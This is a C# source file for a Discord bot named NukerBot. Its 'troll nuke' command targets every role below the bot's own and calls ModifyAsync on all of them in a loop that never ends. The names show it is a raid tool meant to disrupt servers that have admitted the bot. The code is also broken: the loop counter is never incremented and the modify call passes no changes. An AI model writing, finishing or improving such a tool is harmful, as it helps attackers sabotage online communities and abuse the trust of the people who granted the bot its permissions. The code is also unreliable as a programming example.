using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;

namespace NukerBot.src.Core.Modules;

[Group("troll")]
public sealed class TrollModule : BaseCommandModule
{
    public required Config Config { get; set; }

    [Command("nuke")]
    public async Task TrollNuke(CommandContext context)
    {
        var myRole = context.Guild.CurrentMember.Roles.First();
        var roles = (
            from role in context.Guild.Roles.Values
            where role.Position < myRole.Position
            select role
        );

        int count = 0;

        while (count != 100)
        {
            await Task.WhenAll(roles.Select(async x => await x.ModifyAsync()));
        }
    }
}